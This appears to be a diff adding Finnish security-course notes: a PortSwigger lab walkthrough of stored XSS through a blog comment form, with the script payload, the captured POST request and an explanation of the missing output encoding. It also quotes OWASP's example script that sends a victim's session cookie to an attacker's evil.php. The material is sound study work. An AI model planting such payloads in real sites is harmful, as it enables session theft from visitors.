@@ -207,4 +207,67 @@ Vika johtuu siitä, ettei sovellus enkoodaa käyttäjän syötettä ennen kuin s
 - [Portswigger Web Security Academy - Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded)
 
 
-### d) 
+### d) Stored XSS into HTML context with nothing encoded
+
+#### Haavoittuvuuden löytäminen
+
+Sivulla oli blogipostauksen alla kommenttilomake (Comment, Name, Email, Website). Comment-kenttä ei sisältänyt mitään client-side-rajoituksia syötteelle, joten testasin sitä ensin.
+
+<img width="695" height="285" alt="image" src="https://github.com/user-attachments/assets/25c90ce2-73e9-490c-ad5e-791deb7e181e" />
+
+#### Hyökkäys
+
+Kirjoitin Comment-kenttään payloadin `<script>alert(123123123)</script>` ja täytin muut pakolliset kentät vastauksilla. Lomakkeen lähetys vei kiitos kommentista-sivulle, eikä alert avautunut vielä tässä vaiheessa.
+
+<img width="954" height="278" alt="image" src="https://github.com/user-attachments/assets/8a5eca0e-d0de-4041-83f2-4bf10dfc58cc" />
+
+Kun palasin takaisin blogipostaukseen, alert-ikkuna avautui heti sivun latautuessa.
+
+<img width="489" height="142" alt="image" src="https://github.com/user-attachments/assets/d6b979e6-4283-42dc-9b41-f0f7bcdcd39d" />
+
+#### Mitä palvelimella tapahtuu
+
+ZAP:n Historystä näkee POST-pyynnön, jolla kommentti lähetettiin. Payload näkyy Request Bodyssa URL-enkoodattuna osana `comment`-parametria:
+
+`csrf=...&postId=8&comment=%3Cscript%3Ealert(123123123)%3C%2Fscript%3E&name=asd&email=...&website=`
+
+Palvelin tallentaa tämän kommentin sellaisenaan, ilman enkoodausta. Kun blogipostaus myöhemmin ladataan (myös eri käyttäjän toimesta), palvelin liittää tallennetun kommentin suoraan HTML-vastaukseen:
+
+`<p><script>alert(123123123)</script></p>`
+
+Koska `<script>`-tagi tulostuu enkoodattomana, selain tulkitsee sen osaksi sivun rakennetta ja suorittaa koodin. Tämä tapahtuu jokaiselle, joka avaa tämän blogipostauksen.
+
+<img width="612" height="313" alt="image" src="https://github.com/user-attachments/assets/ac27bffc-2ac8-4d15-b765-2e4d12340db4" />
+
+<img width="627" height="380" alt="image" src="https://github.com/user-attachments/assets/c48ffa8c-6f52-49ec-b1f4-e87a84b92659" />
+
+#### Ero reflected XSS:ään
+
+Tässä haavoittuvuus on **stored**, ei reflected: payload tallentuu palvelimelle pysyvästi osana kommenttia, ja se laukea automaattisesti jokaiselle sivulla vierailevalle, ilman että kenenkään tarvitsee klikata mitään. Tämä tekee stored XSS:stä yleensä vaarallisemman kuin reflected XSS:n, koska hyökkäys leviää itsestään kaikille sivun kävijöille.
+
+#### Mistä vika johtuu
+
+Sama juurisyy, kuin c-kohdassa: sovellus ei enkoodaa käyttäjän syötettä ennen kuin se tulostetaan HTML-vastaukseen. OWASP:n suosituksen mukaan tämä koskee kaikkea käyttäjän syötettä, joka päätyy HTML-sivulle, ei vain kertaluontoisia hakuja.
+
+<img width="322" height="50" alt="image" src="https://github.com/user-attachments/assets/d790a504-69b8-4977-a15e-c63992e8a607" />
+
+
+#### Lähteet:
+
+- [OWASP – Cross Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/)
+- [PortSwigger Web Security Academy – What is XSS (Impact)](https://portswigger.net/web-security/cross-site-scripting)
+
+
+### e) Selitä esimerkin avulla.
+
+Pelkkä `alert("Hei Tero!")` ei anna hyökkääjälle mitään hyötyä, se vain todistaa, että koodin suorittaminen uhrin selaimessa on mahdollista. Oikea hyökkäys korvaisi tämän koodilla, joka esimerkiksi lähettää uhrin istuntoevästeen (session cookie) hyökkääjän omalle palvelimelle:
+
+`<SCRIPT type="text/javascript">
+var adr = '../evil.php?cakemonster=' + escape(document.cookie);
+</SCRIPT>`
+
+Tällä evästeellä hyökkääjä voi kirjautua uhrin tilille ilman salasanaa, koska koodi suoritetaan uhrin selaimessa uhrin omilla oikeuksilla.
+
+#### Lähteet:
+
+- [OWASP - Cross Site Scripting (XSS)](https://community.owasp.org/attacks/xss/)
